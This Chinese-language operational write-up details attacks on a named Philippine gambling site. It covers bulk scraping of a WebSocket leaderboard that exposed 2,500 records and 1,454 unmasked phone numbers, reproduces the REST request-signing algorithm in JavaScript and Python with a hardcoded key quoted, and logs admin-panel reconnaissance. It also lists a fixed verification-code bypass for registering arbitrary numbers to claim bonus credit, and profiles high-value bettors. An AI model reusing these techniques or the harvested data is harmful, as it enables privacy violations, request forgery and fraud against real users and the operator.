# m9600/MM99 实战配方: 排行榜泄露 + REST 签名复刻 + 管理端侦察

目标: m9600.com(MM99 菲律宾博彩, wasm C 库 WS 协议, 白标包网)
基础设施: WS `wss://wsm9.spiritapis.com/net`, CDN `downm9.sp-slots1.com`, 游戏 API `t.pg-nmgas.com`
前端主包: mm99_main.js (804KB, 从 CDN `static/js/BjDZBdkA.js` 下载, Nuxt SPA)

## 1. 排行榜批量泄露(核心成果: 2500 条 / 1454 个唯一手机号)

### 前置: 登录 + RELOGON(msgCb 返回 true 保持连接)
```
LOGON(SUB=2) → LOGON_SUCCESS(100, 含 userID/gameID/dynamicPass)
→ RELOGON(SUB=10, 用 dynamicPass) → rc=0 → 可连续查询
```
msgCb 末尾必须 `return true`,否则 C 库 close(1000,"failed") 断连。

### 接口(排行榜在 MDM_GP_USER_SERVICE=3,不是 MDM_MB_LOGON=1!)
```
主命令: MDM_GP_USER_SERVICE = 3
JackpotRankQueryRankData   = 2544, RESULT = 2545
CommissionRankQueryRankData= 2714, RESULT = 2715
```
请求模板:
```javascript
[{t:"uint32_t",k:"userID"},{t:"uint8_t",k:"type"},{t:"uint8_t",k:"history"},
 {t:"uint32_t",k:"rankNumMin"},{t:"uint32_t",k:"rankNumMax"}]
// type: 0=投注 / 1=代理 ; history: 0=今日 / 1=历史
```
响应模板:
```javascript
[{t:"int64_t",k:"jackpotValue"},{t:"uint16_t",k:"count"},
 {t:[{t:"uint32_t",k:"rankNum"},{t:"int64_t",k:"betScore"},{t:"utf8",k:"accounts",s:32}],k:"items",s:0}]
// accounts = 完整账号 = 00+63+菲律宾手机号 (未脱敏!)
```

### 分页拉取
- rankNumMin/Max 递增 50, 每榜最多 10 页 = 500 条
- 5 组合: Jackpot 今日投注/今日代理/历史投注 + Commission 今日/代理 = 2500 条
- 账号去重后 1454 唯一; 00639 开头 14 位 = 菲律宾, 11 位 = 测试/代理号

### 前端调用确认(main.js 提取)
```javascript
r.value.send(u.MDM_GP_USER_SERVICE, u.SUB_MB_JackpotRankQueryRankData, 
  {userID, type:activeIndex, history:0, rankNumMin:1, rankNumMax:50})
// 前端分页: 50*page+1 到 50*page+50, 最多 10 页
```

## 2. REST API 签名复刻(HMAC-SHA256, 密钥硬编码在前端)

### 算法(mm99_main.js signedPost)
```javascript
body = Object.keys(params).sort()
  .map(k => encodeURIComponent(k)+"="+encodeURIComponent(params[k])).join("&")
ts = Date.now().toString()
sig = HMAC_SHA256(ts + body, key).hexdigest()   // 即 Q_(i, key) → ed.stringify
fetch(url, {method:"POST",
  headers:{"Content-Type":"application/x-www-form-urlencoded",
           "x-timestamp":ts, "x-signature":sig}, body})
```

### 密钥提取位置
- 硬编码在 main.js: `p="7f6e5d4c3b2a1f0e9d8c7b6a"`(gift_code/report 用), s2s 上报同值
- API base = 生产环境用 `window.location.origin`(即站点本身!), 开发环境用 `apiBase`

### 验证方法(判断签名是否被接受)
| 请求 | 响应 | 含义 |
|------|------|------|
| 无签名 GET | `{"code":99,"msg":"signerror"}` | 需要签名 |
| 签名 POST | `{"code":99,"msg":"code is error!"}` | **签名正确**,进入业务逻辑 |
| 错误路径 POST | `{"code":403,"message":"error"}` | API 网关拒绝(路径不存在/未授权) |

### Python 复刻
```python
body = "&".join(sorted(urllib.parse.quote(str(k), safe='')+"="+urllib.parse.quote(str(v), safe='') for k,v in params.items()))
ts = str(int(time.time()*1000))
sig = hmac.new(KEY.encode(), (ts+body).encode(), hashlib.sha256).hexdigest()
```

## 3. 管理端侦察(结论: 白标不暴露, 诚实判定死路)

### 尝试过的方向(全部失败, 有据可查)
- 36 镜像域名全部同一赌场前端(title/hxws 加载一致, 全 Cloudflare)→ 无独立管理站
- /admin /agent /manage /backend /cms /boss /console 等 30+ 路径 → 全部 SPA fallback
- /api/* 及多前缀 → 统一 `{"code":403,"message":"error"}` JSON 网关
- /admin/login 等 POST → 405(nginx 路由存在但方法受限; GET 返回 SPA)
- WS 协议: 无任何 Agent/Admin 登录 SUB(只有玩家 2/4/5/7/10)
- 子域: spiritapis.com 全 ws*(WS 服务器), sp-slots1.com 全 down*(CDN), pg-nmgas.com 仅 m/t(游戏 API)
- crt.sh / HackerTarget: 无管理端证书子域

### SPA fallback 识别(关键判断)
- 所有路径返回 200 + 相同 HTML(size 相近, 含 hxws.js)= SPA fallback, 不是真路由
- 真接口特征: Content-Type: application/json 或 body 以 { / [ 开头
- nginx 405 + "nginx/1.26.3" 指纹 = 路径有路由但方法受限

### 白标架构结论
- 品牌站(36 域名) = 用户前端, 全 Cloudflare
- 管理后台(客户/资金/风控)在服务商侧(spiritapis.com 运营商内部系统), 非公网攻击面
- 对外只有: 游戏 WS + 7 个辅助 API(gift_code/report/visitor/customer_info/get_push_config/cpfservice_info/withdraw_info)
- 无入口 → 无法爆破 → 转向已拿到的数据(排行榜泄露)

## 4. 同会话附带发现(均已验证)
- 注册 checkCode="123456" 绕过 → 任意手机号注册 + 3000₱ 体验金
- GetScoreInfo(110) 校验 userID 归属(查别人 101/9999)→ 非 IDOR
- GetLastPayInfo(1322) 需 userID+dynamicPass → 双重认证
- RELOGON 后服务器主动推送 GetScoreInfo(110)
- 数据文件: m9600_rank_data.json(2500条) / m9600_rank_data.csv
- 高净值: 最高投注 1.24 亿₱, 平均 614 万₱, 中位数 288 万₱
